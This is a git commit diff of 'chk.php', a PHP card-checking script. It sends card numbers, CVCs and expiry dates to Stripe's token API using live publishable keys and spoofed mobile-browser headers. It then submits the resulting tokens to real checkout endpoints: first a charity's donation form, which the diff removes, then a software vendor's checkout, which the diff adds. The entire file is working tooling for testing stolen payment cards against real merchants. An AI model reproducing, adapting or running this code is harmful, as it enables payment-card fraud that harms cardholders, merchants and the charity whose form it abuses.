b766891a91f922bae18a7da5ff12741f8cb8c4af
AnonBD <99282155+anonbd1@users.noreply.github.com>
2022-04-03 17:38:36 +0600

    Update chk.php

--- chk.php
+++ chk.php
@@ -65,7 +65,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&pasted_fields=number&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=360685&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e59ba6de-cb48-4fd6-8702-de7f9b9dbd19de173f&muid=e172c97f-f80d-4438-8898-558da2a7ebff069436&sid=9f3dbff3-a1ea-402c-94c4-9a218d5155e85c4263&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=46722&key=pk_live_tyioedKnjQd314YfV0C5ane7');
 
 
 $result1 = curl_exec($ch);
@@ -73,65 +73,31 @@ $tk = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 #==================[2 REQ]
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://wpmudev.com/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
 $headers = array();
-$headers[] = 'Host: api.stripe.com';
+$headers[] = 'Host: wpmudev.com';
 $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
-$headers[] = 'accept: application/json';
-$headers[] = 'content-type: application/x-www-form-urlencoded';
+$headers[] = 'accept: */*';
+$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
 $headers[] = 'sec-ch-ua-mobile: ?1';
 $headers[] = 'save-data: on';
 $headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
 $headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = 'origin: https://js.stripe.com';
+$headers[] = 'origin: https://wpmudev.com';
 $headers[] = 'sec-fetch-site: same-site';
 $headers[] = 'sec-fetch-mode: cors';
 $headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://js.stripe.com/';
+$headers[] = 'referer: https://wpmudev.com/checkout/';
 $headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=362283&key=pk_live_QMBU860cL1m4otZJNXjcDFyq&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wpmudev_stripe_checkout&_wpnonce=e749763f87&_session=23cb1a3ec0&coupon=&project_id=&product=full-1-site&period=12&plan=&quantity=1&plan_url=product%3Dfull-1-site%26period%3D12%26quantity%3D1&skip_trial=0&group=&stripe_payment_method='.$tk.'&intent_id=&intent_secret=&name='.$name.'+'.$last.'');
 $result2 = curl_exec($ch);
-$tk2 = trim(strip_tags(getStr($result2,'"id": "','"')));
-
-#=================[3rd req]
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/wp-admin/admin-ajax.php');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'Host: hopeinlancaster.org';
-$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
-$headers[] = 'sec-ch-ua-mobile: ?1';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
-$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'accept: */*';
-$headers[] = 'x-requested-with: XMLHttpRequest';
-$headers[] = 'save-data: on';
-$headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = 'origin: https://hopeinlancaster.org';
-$headers[] = 'sec-fetch-site: same-origin';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://hopeinlancaster.org/donations/';
-$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
-$headers[] = 'cookie: __stripe_mid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e';
-$headers[] = 'cookie: __stripe_sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$tk2.'&paymentMethodID='.$tk.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=payment&amount=NTAuMDA%3D&params%5Bvalue%5D=ds-1550084928589&params%5Bname%5D=HOPE+In+Lancaster%2C+Inc&params%5Bamount%5D=NTAuMDA%3D&params%5Bdescription%5D=%2450.00+One-Time+Donation&params%5Bpanellabel%5D=Confirm+Payment&params%5Btype%5D=payment&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Fsuccess&params%5Berror_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Ffail&params%5Bbutton_id%5D=MyButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_QMBU860cL1m4otZJNXjcDFyq&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fhopeinlancaster.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.hopeinlancaster.org%2Fwp-content%2Fuploads%2F2016%2F03%2FHOPE-LOGO.png&params%5Binstance%5D=ds1550084928589&params%5Bds_nonce%5D=329a05b2f1&ds_nonce=329a05b2f1');
-$result3 = curl_exec($ch);
-$msg = trim(strip_tags(getStr($result3,'message":"','"')));
-
 
 #===============[Card Response]
 if (strpos($result33, '"cvc_check": "pass"')) {
@@ -194,5 +160,5 @@ else {
 
 curl_close($ch);
 ob_flush();
-
+echo "<b>2REQ Result:</b> $result2<br><br>";
 ?>
